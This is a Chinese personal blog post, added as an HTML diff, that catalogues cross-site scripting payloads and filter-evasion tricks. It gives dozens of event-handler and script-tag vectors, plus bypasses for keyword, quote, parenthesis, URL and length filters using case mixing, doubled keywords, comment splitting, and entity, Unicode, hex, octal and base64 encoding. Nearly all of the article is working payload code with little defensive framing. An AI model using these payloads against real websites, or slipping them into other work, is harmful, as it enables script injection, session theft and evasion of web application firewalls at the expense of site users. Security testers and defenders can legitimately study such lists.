@@ -1,0 +1,699 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://img.icons8.com/ios-filled/50/github.png">
+  <link rel="icon" href="https://img.icons8.com/ios-filled/50/github.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="📌 1、基本语句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;&amp;lt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss漏洞的代码构造思路">
+<meta property="og:url" content="http://example.com/2024/07/01/xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%A3%E7%A0%81%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="📌 1、基本语句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;&amp;lt">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-01T09:13:20.347Z">
+<meta property="article:modified_time" content="2025-07-13T16:25:15.136Z">
+<meta property="article:author" content="Ninja">
+<meta property="article:tag" content="xss漏洞">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>xss漏洞的代码构造思路 - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密聊天频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xss漏洞的代码构造思路"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-01 17:13" pubdate>
+          2024年7月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xss漏洞的代码构造思路</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年7月14日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="📌-1、基本语句"><a href="#📌-1、基本语句" class="headerlink" title="📌 1、基本语句"></a>📌 1、基本语句</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>			# 如果目标定义了<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>才能弹<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;		# 查看cookie<br><br># 图片加载错误时触发<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;<br># 鼠标指针移动到元素时触发<br>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;<br># 鼠标指针移出时触发<br>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;<br><br>&lt;a href=javascript:alert(1)&gt;<br>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;<br>&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;test&lt;/a&gt;<br>&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;<br>&lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;a&lt;/a&gt;<br>&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;<br>&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt;<br><br># 元素上按下鼠标时触发<br>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;<br># 元素上释放鼠标时触发<br>&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;<br><br># 元素上点击鼠标时触发<br>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;<br><br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br># 竞争焦点，从而触发onblur事件<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br># 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;<br>&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;<br># 按下按键时触发<br>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;<br># 按下按键时触发<br>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;<br># 松开按键式时触发<br>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;<br><br>&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;<br>&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;<br>&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;<br>&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;<br>&lt;form action=1 onmouseover=alert(&#x27;xss)&gt;<br>&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;<br>&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br><br>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;<br>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;<br>&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br>&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;<br>&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="📌-2、绕过限制"><a href="#📌-2、绕过限制" class="headerlink" title="📌 2、绕过限制"></a>📌 2、绕过限制</h2><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 用 / 代替空格<br>&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 大小写绕过<br>&lt;<span class="hljs-title class_">ImG</span> sRc=x onerRor=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br># 双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br>&lt;imimgg srsrcc=x onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&gt;<br># 字符拼接(利用<span class="hljs-built_in">eval</span>)<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;</span>&gt;<br># 字符拼接(利用top)<br>&lt;script&gt;top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&lt;/script&gt;(只有两个<span class="hljs-string">``</span>这里是为了凸显出有<span class="hljs-string">`符号)</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 利用注释和标签优先级<br>&lt;&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);<span class="hljs-comment">//&lt;&lt;/script&gt;</span><br>&lt;scri&lt;!--test--&gt;pt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello world!&quot;</span>)&lt;/scri&lt;!--test--&gt;pt&gt;<br>&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; <br># 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效<br>&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># <span class="hljs-title class_">Unicode</span>编码绕过<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;# 97;&amp;# 108;&amp;# 101;&amp;# 114;&amp;# 116;&amp;# 40;&amp;# 34;&amp;# 120;&amp;# 115;&amp;# 115;&amp;# 34;&amp;# 41;&amp;# 59;&quot;</span>&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br># url编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br># Ascii码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br># Hex绕过<br>&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br># 八进制绕过<br>&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;<br># base64绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># html标签内可省略引号；js中可用反引号代替单双引号<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&gt;<br># 使用编码绕过<br></code></pre></td></tr></table></figure>
+
+<h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 括号被过滤可用<span class="hljs-keyword">throw</span>绕过<br>&lt;svg/onload=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"># 使用url编码<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">``</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;</span><br># 使用<span class="hljs-variable constant_">IP</span>格式<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">``</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//2130706433/``&gt;十进制</span><br>&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制<br>&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制<br>&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//代替http://<br># 使用反斜杠（注意Windows下为file协议）<br># 中文逗号代替英文逗号<br>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="📌-3、绕过思路"><a href="#📌-3、绕过思路" class="headerlink" title="📌 3、绕过思路"></a>📌 3、绕过思路</h2><h3 id="一、白名单绕过"><a href="#一、白名单绕过" class="headerlink" title="一、白名单绕过"></a>一、白名单绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;xxx&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h4 id="1-闭合标签构造语句"><a href="#1-闭合标签构造语句" class="headerlink" title="1.闭合标签构造语句"></a>1.闭合标签构造语句</h4><p>当白名单较宽松，” 和 &lt;&gt; 均可用时：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(5)&quot;</span>/&gt;</span>&quot;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>若 “ 被限制，可利用HTML标签优先级：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;/title&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=1 onerror=alert(1)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-闭合属性构造xss"><a href="#2-闭合属性构造xss" class="headerlink" title="2.闭合属性构造xss"></a>2.闭合属性构造xss</h4><p>若 &lt;&gt; 不可用，但onerror属性可控，可闭合src属性构造：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;title&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>若 &lt;&gt; ‘ “ 全部限制，可用实体编码绕过：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="二、绕过长度限制"><a href="#二、绕过长度限制" class="headerlink" title="二、绕过长度限制"></a>二、绕过长度限制</h3><p>长度限制在20字符以内时，可用分段拼接：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;p&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;xxx&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><br># 基本闭合语句<br><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>此语句较长，可用多点分段结合注释拼接：</p>
+<h4 id="1-利用注释符拼接"><a href="#1-利用注释符拼接" class="headerlink" title="1.利用注释符拼接"></a>1.利用注释符拼接</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;p&gt;&lt;img src=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;<br>&lt;p&gt;&lt;img src=&quot;*/alert(1)/*&quot;&gt;&lt;/p&gt;<br>&lt;p&gt;&lt;img src=&quot;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/xss%E6%BC%8F%E6%B4%9E/" class="print-no-link">#xss漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
